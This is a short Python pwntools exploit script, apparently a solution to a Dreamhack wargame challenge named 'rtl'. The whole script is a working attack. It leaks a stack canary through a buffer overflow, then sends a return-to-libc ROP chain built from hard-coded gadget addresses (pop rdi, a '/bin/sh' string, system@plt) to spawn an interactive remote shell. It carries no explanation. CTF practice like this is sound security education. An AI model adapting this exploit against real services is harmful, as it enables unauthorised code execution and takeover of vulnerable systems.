from pwn import *

p = remote('host8.dreamhack.games', 12307)
e = ELF('./rtl')

buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))

ret = 0x400596
pop_rdi = 0x400853
binsh = 0x400874
system_plt = 0x4005d0

payload = b'A' * 0x38
payload += p64(cnry)
payload += b'B' * 0x8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

p.sendafter(b'Buf: ', payload)
p.interactive()